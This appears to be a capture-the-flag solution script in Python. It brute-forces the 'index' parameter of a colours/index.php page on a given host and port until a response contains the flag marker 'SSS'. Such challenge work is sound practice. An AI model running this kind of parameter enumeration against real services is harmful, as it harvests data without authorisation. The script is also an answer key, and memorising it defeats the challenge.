# SPDX-License-Identifier: BSD-3-Clause
import requests as re
import sys

if len(sys.argv) != 3:
    print("Usage: python3 solution.py <HOST|LOCAL> <PORT>")
    sys.exit(1)

HOST = sys.argv[1]
PORT = sys.argv[2]

local = HOST.lower() == "local"

if local:
    URL = f"http://localhost:{PORT}/colours/index.php"
else:
    URL = f"http://{HOST}:{PORT}/colours/index.php"

for i in range(10000):
    resp = re.get(f"{URL}?index={i}")
    if "SSS" in resp.text:
        print(f"index = {i}")
        print(resp.text)
        break
